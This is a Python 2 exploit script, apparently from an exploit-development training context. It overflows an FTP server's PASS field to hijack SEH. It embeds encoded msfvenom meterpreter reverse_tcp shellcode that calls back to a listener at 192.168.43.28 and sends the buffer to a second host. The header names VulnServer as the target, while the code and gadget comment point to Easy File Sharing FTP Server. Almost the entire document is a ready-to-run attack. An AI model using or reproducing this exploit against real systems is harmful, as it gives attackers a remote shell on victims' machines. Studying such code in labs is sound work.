# Created by: Uday Mittal (Yaksas CSC)

# This code exploits the buffer overflow vulnerability in VulnServer. 


# SEH offset: 2563
# 0x100189b4 : pop esi # pop ecx # ret  |  {PAGE_EXECUTE_READ} [SSLEAY32.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Easy File Sharing FTP Server\SSLEAY32.dll)
# command to generate shellcode: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.28 LPORT=4444 -b '\x00\x0A\x0D\x40' -f python
# short jump: jmp $+20 EB12


import sys
import socket


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buf =  ""
buf += "\xda\xc3\xbf\x9a\xaa\x1f\x78\xd9\x74\x24\xf4\x5a\x33"
buf += "\xc9\xb1\x56\x31\x7a\x18\x83\xea\xfc\x03\x7a\x8e\x48"
buf += "\xea\x84\x46\x0e\x15\x75\x96\x6f\x9f\x90\xa7\xaf\xfb"
buf += "\xd1\x97\x1f\x8f\xb4\x1b\xeb\xdd\x2c\xa8\x99\xc9\x43"
buf += "\x19\x17\x2c\x6d\x9a\x04\x0c\xec\x18\x57\x41\xce\x21"
buf += "\x98\x94\x0f\x66\xc5\x55\x5d\x3f\x81\xc8\x72\x34\xdf"
buf += "\xd0\xf9\x06\xf1\x50\x1d\xde\xf0\x71\xb0\x55\xab\x51"
buf += "\x32\xba\xc7\xdb\x2c\xdf\xe2\x92\xc7\x2b\x98\x24\x0e"
buf += "\x62\x61\x8a\x6f\x4b\x90\xd2\xa8\x6b\x4b\xa1\xc0\x88"
buf += "\xf6\xb2\x16\xf3\x2c\x36\x8d\x53\xa6\xe0\x69\x62\x6b"
buf += "\x76\xf9\x68\xc0\xfc\xa5\x6c\xd7\xd1\xdd\x88\x5c\xd4"
buf += "\x31\x19\x26\xf3\x95\x42\xfc\x9a\x8c\x2e\x53\xa2\xcf"
buf += "\x91\x0c\x06\x9b\x3f\x58\x3b\xc6\x57\xad\x76\xf9\xa7"
buf += "\xb9\x01\x8a\x95\x66\xba\x04\x95\xef\x64\xd2\xac\xf8"
buf += "\x96\x0c\x16\x68\x69\xad\x66\xa0\xae\xf9\x36\xda\x07"
buf += "\x82\xdd\x1a\xa7\x57\x4b\x11\x3f\x98\x23\x0e\xa3\x70"
buf += "\x31\x51\xca\xdc\xbc\xb7\xbc\x8c\xee\x67\x7d\x7d\x4e"
buf += "\xd8\x15\x97\x41\x07\x05\x98\x88\x20\xac\x77\x64\x18"
buf += "\x59\xe1\x2d\xd2\xf8\xee\xf8\x9e\x3b\x64\x08\x5e\xf5"
buf += "\x8d\x79\x4c\xe2\xe9\x81\x8c\xf3\x9f\x81\xe6\xf7\x09"
buf += "\xd6\x9e\xf5\x6c\x10\x01\x05\x5b\x23\x46\xf9\x1a\x15"
buf += "\x3c\xcc\x88\x19\x2a\x31\x5d\x99\xaa\x67\x37\x99\xc2"
buf += "\xdf\x63\xca\xf7\x1f\xbe\x7f\xa4\xb5\x41\x29\x18\x1d"
buf += "\x2a\xd7\x47\x69\xf5\x28\xa2\xe9\xf2\xd6\x30\xc6\x5a"
buf += "\xbe\xca\x56\x5b\x3e\xa1\x56\x0b\x56\x3e\x78\xa4\x96"
buf += "\xbf\x53\xed\xbe\x4a\x32\x5f\x5f\x4a\x1f\x01\xc1\x4b"
buf += "\xac\x9a\xf2\x36\xdd\x1d\xf3\xc6\xf7\x79\xf4\xc6\xf7"
buf += "\x7f\xc9\x10\xce\xf5\x0c\xa1\x75\x05\x3b\x84\xdc\x8c"
buf += "\x43\x9a\x1f\x85"


evilString = "\x2c" + "A"* 2559 + "\xEB\x12\x90\x90" + "\xb4\x89\x01\x10" + "\x90" * 50 + buf + "\x90"*1100

s.connect(('192.168.43.72',21))
print s.recv(1024)
s.send("USER anonymous\r\n")
print s.recv(1024)
s.send("PASS "+evilString+"\r\n")
print s.recv(1024)
s.close()
